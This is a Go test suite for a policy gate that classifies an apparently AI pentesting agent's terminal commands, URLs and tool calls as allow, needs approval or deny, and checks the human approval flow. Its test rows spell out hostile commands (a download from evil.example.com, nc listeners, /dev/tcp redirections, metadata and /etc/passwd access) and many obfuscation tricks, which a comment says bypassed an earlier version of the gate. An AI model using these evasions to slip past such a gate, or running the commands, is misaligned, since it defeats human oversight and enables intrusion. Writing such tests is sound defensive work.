package scopegate

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"
	"time"

	"pentagi/pkg/tools"
)

func assertVerdicts(t *testing.T, g *Gate, cases []struct {
	cmd  string
	want Verdict
}) {
	t.Helper()
	for _, tc := range cases {
		t.Run(tc.cmd, func(t *testing.T) {
			d := g.Evaluate(terminal(tc.cmd))
			if d.Verdict != tc.want {
				t.Errorf("verdict = %s, want %s (reasons: %s)", d.Verdict, tc.want, strings.Join(d.Reasons, "; "))
			}
			if d.Verdict != Allow && len(d.Reasons) == 0 {
				t.Error("non-allow verdict without a reason")
			}
		})
	}
}

func TestGate_Evaluate_TerminalCommands(t *testing.T) {
	assertVerdicts(t, newGate(t, labPolicy()), []struct {
		cmd  string
		want Verdict
	}{
		{"id", Allow},
		{"/usr/bin/id", Allow},
		{"cat results.txt | grep open", Allow},
		{"ls -la /work > listing.txt 2>&1", Allow},
		{"grep -c 'open port' scan.gnmap", Allow},
		{"echo visit http://evil.example.com", Allow},
		{"curl -s http://10.10.10.5/login", RequireApproval},
		{"curl https://target.lab/v1", RequireApproval},
		{"curl https://app.corp.lab/", RequireApproval},
		{"nmap -sV 10.10.10.5", RequireApproval},
		{"sudo timeout 55 nmap -p- 10.10.10.5", RequireApproval},
		{"ssh root@10.10.10.7", RequireApproval},
		{"nc -zv 192.168.56.101 22", RequireApproval},
		{"masscan 10.10.10.0/24 -p80", RequireApproval},
		{"echo scan 10.10.10.1-50 | nmap -iL -", RequireApproval},
		{"dig unknown.example.org", RequireApproval},
		{"dig api.target.lab", RequireApproval},
		{"python3 -m http.server 8000", RequireApproval},
		{"curl http://127.0.0.1:8080/", RequireApproval},
		{"nc -lvnp 4444 -s 0.0.0.0", RequireApproval},
		{"echo $(cat /etc/hostname)", RequireApproval},
		{"/tmp/ls", RequireApproval},
		{"LS", RequireApproval},
		{"PATH=/tmp ls", RequireApproval},
		{"echo 'unterminated", RequireApproval},
		{"", RequireApproval},
		{"curl -s http://10.10.11.5/login", Deny},
		{"ping -c1 8.8.8.8", Deny},
		{"ssh root@10.10.99.7", Deny},
		{"nc -zv 192.168.56.102 22", Deny},
		{"curl https://evil.example.com/x.sh", Deny},
		{"curl https://api.target.lab/v1", Deny},
		{"curl https://corp.lab/", Deny},
		{"nmap -sV 10.10.20.5", Deny},
		{"masscan 10.10.0.0/16 -p80", Deny},
		{"masscan 10.10.10.0/23 -p80", Deny},
		{"nmap 10.10.10.5,8.8.8.8", Deny},
		{"curl http://169.254.169.254/latest/meta-data/", Deny},
		{"curl --url=http://203.0.113.9/", Deny},
		{"curl http://[2001:db8::1]/", Deny},
		{"curl http://target.lab@8.8.8.8/", Deny},
		{"ls; curl http://8.8.8.8/", Deny},
	})
}

// Each row is a bypass of the earlier gate (H-1: targets it could not parse were
// dropped; H-2: commands it could not name escaped the approval list).
func TestGate_Evaluate_TerminalBypassAttemptsNeverAllow(t *testing.T) {
	cases := []struct {
		cmd  string
		want Verdict
	}{
		{"curl http://134744072/", RequireApproval},
		{"curl http://0x8.0x8.0x8.0x8/", RequireApproval},
		{"curl http://010.010.010.005/", RequireApproval},
		{"nc 0x08080808 53", RequireApproval},
		{"ping 10.1", RequireApproval},
		{"curl 'http://8.8.8.8/%zz'", RequireApproval},
		{"curl 8.8.8.8>/dev/null", Deny},
		{"curl e'v'il.com", RequireApproval},
		{`curl ev\il.com`, RequireApproval},
		{"T=8.8.8.8; curl $T", RequireApproval},
		{"curl $'http://\\x65vil.com'", RequireApproval},
		{"psql -h pgvector", RequireApproval},
		{"curl http://intranet/", RequireApproval},
		{"curl http://ｅvil.com/", RequireApproval},
		{"curl -K cfg", RequireApproval},
		{"wget -i list", RequireApproval},
		{"cat < /dev/tcp/8.8.8.8/53", RequireApproval},
		{"echo hi > /dev/udp/10.10.10.5/53", RequireApproval},
		{"ls >(nc 8.8.8.8 53)", Deny},
		{"if true; then nmap 10.10.10.5; fi", RequireApproval},
		{"! nmap 10.10.10.5", RequireApproval},
		{"{ nmap 10.10.10.5; }", RequireApproval},
		{"exec nmap 10.10.10.5", RequireApproval},
		{"command nmap 10.10.10.5", RequireApproval},
		{"n''map 10.10.10.5", RequireApproval},
		{`nm\ap 10.10.10.5`, RequireApproval},
		{"setsid nmap 10.10.10.5", RequireApproval},
		{"watch nmap 10.10.10.5", RequireApproval},
		{"find / -exec nmap 10.10.10.5 ;", RequireApproval},
		{"awk 'BEGIN{system(\"nmap 10.10.10.5\")}'", RequireApproval},
		{"sort --compress-program=nc x", RequireApproval},
		{"echo nmap 10.10.10.5 | sh", RequireApproval},
		{"ls\nnmap 10.10.10.5", RequireApproval},
		{"ls # ; nmap 10.10.10.5", RequireApproval},
		{"/usr/bin/../../tmp/x", RequireApproval},
		{"/usr/bin/nmap 10.10.10.5", RequireApproval},
		{"x=1 ls", RequireApproval},
		{"busybox nc 10.10.10.5 80", RequireApproval},
	}
	g := newGate(t, labPolicy())
	assertVerdicts(t, g, cases)
	for _, tc := range cases {
		if g.Evaluate(terminal(tc.cmd)).Verdict == Allow {
			t.Errorf("%q is allowed", tc.cmd)
		}
	}
}

func TestGate_Evaluate_NoAutoApproveMeansEveryCommandNeedsApproval(t *testing.T) {
	p := labPolicy()
	p.AutoApproveBinaries = nil
	g := newGate(t, p)
	for _, cmd := range []string{"id", "ls", "cat results.txt"} {
		if d := g.Evaluate(terminal(cmd)); d.Verdict != RequireApproval {
			t.Errorf("%q: verdict = %s, want require_approval", cmd, d.Verdict)
		}
	}
}

func TestGate_Evaluate_Browser(t *testing.T) {
	cases := []struct {
		url  string
		want Verdict
	}{
		{"http://10.10.10.5/admin", Allow},
		{"https://target.lab/", Allow},
		{"https://TARGET.lab./", Allow},
		{"https://www.target.lab/", Deny},
		{"http://127.0.0.1:9000/", Deny},
		{"http://10.10.10.5.nip.io/", Deny},
		{"file:///etc/passwd", Deny},
		{"gopher://10.10.10.5/", Deny},
		{"not a url", Deny},
	}
	g := newGate(t, labPolicy())
	for _, tc := range cases {
		t.Run(tc.url, func(t *testing.T) {
			if d := g.Evaluate(browser(tc.url)); d.Verdict != tc.want {
				t.Errorf("verdict = %s, want %s (reasons: %s)", d.Verdict, tc.want, strings.Join(d.Reasons, "; "))
			}
		})
	}
}

func TestGate_Evaluate_ToolAllowlist(t *testing.T) {
	g := newGate(t, labPolicy())
	cases := []struct {
		name string
		call Call
		want Verdict
	}{
		{"allowed tool", Call{Agent: "pentester", Tool: "hack_result", Args: json.RawMessage(`{}`)}, Allow},
		{"tool not in agent list", Call{Agent: "searcher", Tool: "terminal", Args: json.RawMessage(`{"input":"id"}`)}, Deny},
		{"unknown agent", Call{Agent: "coder", Tool: "file", Args: json.RawMessage(`{}`)}, Deny},
		{"unclassified tool even if listed", Call{Agent: "pentester", Tool: "advice_v2", Args: json.RawMessage(`{}`)}, Deny},
		{"malformed terminal args", Call{Agent: "pentester", Tool: "terminal", Args: json.RawMessage(`{"input":`)}, Deny},
		{"terminal args of wrong type", Call{Agent: "pentester", Tool: "terminal", Args: json.RawMessage(`{"input":42}`)}, Deny},
	}
	p := labPolicy()
	p.AgentTools["pentester"] = append(p.AgentTools["pentester"], "advice_v2")
	g = newGate(t, p)
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if d := g.Evaluate(tc.call); d.Verdict != tc.want {
				t.Errorf("verdict = %s, want %s (reasons: %s)", d.Verdict, tc.want, strings.Join(d.Reasons, "; "))
			}
		})
	}
}

func TestGate_Evaluate_ExternalSearchFollowsPolicy(t *testing.T) {
	call := Call{Agent: "searcher", Tool: "web_search", Args: json.RawMessage(`{"query":"apache 2.4.49 exploit"}`)}
	for _, v := range []Verdict{Deny, RequireApproval, Allow} {
		p := labPolicy()
		p.ExternalSearch = v
		if got := newGate(t, p).Evaluate(call).Verdict; got != v {
			t.Errorf("ExternalSearch=%s: verdict = %s", v, got)
		}
	}
}

func TestGate_Evaluate_EmptyScopeDeniesEveryDefiniteTarget(t *testing.T) {
	p := labPolicy()
	p.Scope = Scope{}
	g := newGate(t, p)
	if d := g.Evaluate(terminal("curl http://10.10.10.5/")); d.Verdict != Deny {
		t.Errorf("verdict = %s, want deny", d.Verdict)
	}
	if d := g.Evaluate(terminal("id")); d.Verdict != Allow {
		t.Errorf("a command without targets: verdict = %s, want allow", d.Verdict)
	}
}

func TestGate_Evaluate_FingerprintIgnoresKeyOrderOnly(t *testing.T) {
	g := newGate(t, labPolicy())
	a := g.Evaluate(Call{FlowID: 7, Agent: "pentester", Tool: "terminal", Args: json.RawMessage(`{"input":"id","cwd":"/w"}`)})
	b := g.Evaluate(Call{FlowID: 7, Agent: "pentester", Tool: "terminal", Args: json.RawMessage(`{"cwd":"/w", "input":"id"}`)})
	c := g.Evaluate(Call{FlowID: 8, Agent: "pentester", Tool: "terminal", Args: json.RawMessage(`{"input":"id","cwd":"/w"}`)})
	d := g.Evaluate(Call{FlowID: 7, Agent: "pentester", Tool: "terminal", Args: json.RawMessage(`{"input":"id ","cwd":"/w"}`)})
	if a.Fingerprint != b.Fingerprint {
		t.Error("key order changed the fingerprint")
	}
	if a.Fingerprint == c.Fingerprint || a.Fingerprint == d.Fingerprint {
		t.Error("a different flow or argument kept the fingerprint")
	}
}

func TestGate_ToolClasses_CoverEveryRegistryTool(t *testing.T) {
	for name := range tools.GetRegistryDefinitions() {
		if toolClasses[name] == classUnknown {
			t.Errorf("registry tool %q has no scope classification, so the gate denies it", name)
		}
	}
}

func TestGate_Authorize(t *testing.T) {
	g := newGate(t, labPolicy())
	cases := []struct {
		name         string
		call         Call
		approver     *fakeApprover
		wantErr      bool
		wantApproval int
	}{
		{"allow needs no approver", terminal("id"), &fakeApprover{}, false, 0},
		{"approved", terminal("nmap 10.10.10.5"), &fakeApprover{approve: true}, false, 1},
		{"rejected", terminal("nmap 10.10.10.5"), &fakeApprover{approve: false}, true, 1},
		{"approver error", terminal("nmap 10.10.10.5"), &fakeApprover{approve: true, err: errors.New("ui gone")}, true, 1},
		{"deny is never sent for approval", terminal("nmap 8.8.8.8"), &fakeApprover{approve: true}, true, 0},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := g.Authorize(context.Background(), tc.call, tc.approver)
			if (err != nil) != tc.wantErr {
				t.Fatalf("err = %v, wantErr %v", err, tc.wantErr)
			}
			if err != nil && !errors.Is(err, ErrDenied) {
				t.Errorf("err = %v, want ErrDenied", err)
			}
			if tc.approver.count() != tc.wantApproval {
				t.Errorf("approver asked %d times, want %d", tc.approver.count(), tc.wantApproval)
			}
		})
	}
}

func TestGate_Authorize_NoApproverDenies(t *testing.T) {
	g := newGate(t, labPolicy())
	if _, err := g.Authorize(context.Background(), terminal("nmap 10.10.10.5"), nil); !errors.Is(err, ErrDenied) {
		t.Errorf("err = %v, want ErrDenied", err)
	}
}

func TestGate_Authorize_ApprovalRequestCarriesTheDecision(t *testing.T) {
	g := newGate(t, labPolicy())
	approver := &fakeApprover{approve: true}
	call := terminal("nmap 10.10.10.5")

	if _, err := g.Authorize(context.Background(), call, approver); err != nil {
		t.Fatalf("Authorize: %v", err)
	}
	req := approver.requests[0]
	if req.Decision.Verdict != RequireApproval || req.Decision.Fingerprint != g.Evaluate(call).Fingerprint {
		t.Errorf("request decision = %+v", req.Decision)
	}
	if len(req.Decision.Targets) != 1 || req.Decision.Targets[0].Value != "10.10.10.5" {
		t.Errorf("targets = %+v, want 10.10.10.5", req.Decision.Targets)
	}
}

func TestGate_Authorize_CancelledWhileWaitingDenies(t *testing.T) {
	g := newGate(t, labPolicy())
	ctx, cancel := context.WithTimeout(context.Background(), 50*time.Millisecond)
	defer cancel()

	done := make(chan error, 1)
	go func() {
		_, err := g.Authorize(ctx, terminal("nmap 10.10.10.5"), &fakeApprover{approve: true, block: true})
		done <- err
	}()
	select {
	case err := <-done:
		if !errors.Is(err, ErrDenied) || !errors.Is(err, context.DeadlineExceeded) {
			t.Errorf("err = %v, want ErrDenied wrapping the deadline", err)
		}
	case <-time.After(10 * time.Second):
		t.Fatal("Authorize kept waiting after its context ended")
	}
}

func TestGate_Authorize_ApprovalAfterCancellationStillDenies(t *testing.T) {
	g := newGate(t, labPolicy())
	ctx, cancel := context.WithCancel(context.Background())
	approver := approveAfterCancel(cancel)

	if _, err := g.Authorize(ctx, terminal("nmap 10.10.10.5"), approver); !errors.Is(err, ErrDenied) {
		t.Errorf("err = %v, want ErrDenied", err)
	}
}

type approveAfterCancel context.CancelFunc

func (a approveAfterCancel) Approve(context.Context, ApprovalRequest) (bool, error) {
	a()
	return true, nil
}

// The approver sees the reasons, so each fail-closed path must name what it could
// not understand, not merely lower the verdict.
func TestGate_Evaluate_ReasonsNameWhatWasNotUnderstood(t *testing.T) {
	g := newGate(t, labPolicy())
	cases := []struct {
		cmd    string
		reason string
	}{
		{"curl http://intranet/", `cannot parse possible target "http://intranet/"`},
		{"curl 'http://8.8.8.8/%zz'", "cannot parse possible target"},
		{"x=1 ls", "variable assignment"},
		{"n''map 10.10.10.5", "quoted or escaped command name"},
		{"if true; then id; fi", "shell keyword if"},
		{"/tmp/ls", "command path outside the standard binary directories"},
		{"cat < /dev/tcp/8.8.8.8/53", "network pseudo-device"},
		{"ls `pwd`", "command substitution"},
		{"nmap 10.10.10.5", `command runs "nmap", which is not auto-approved`},
	}
	for _, tc := range cases {
		d := g.Evaluate(terminal(tc.cmd))
		if !strings.Contains(strings.Join(d.Reasons, "\n"), tc.reason) {
			t.Errorf("%q: reasons %q lack %q", tc.cmd, d.Reasons, tc.reason)
		}
	}
}
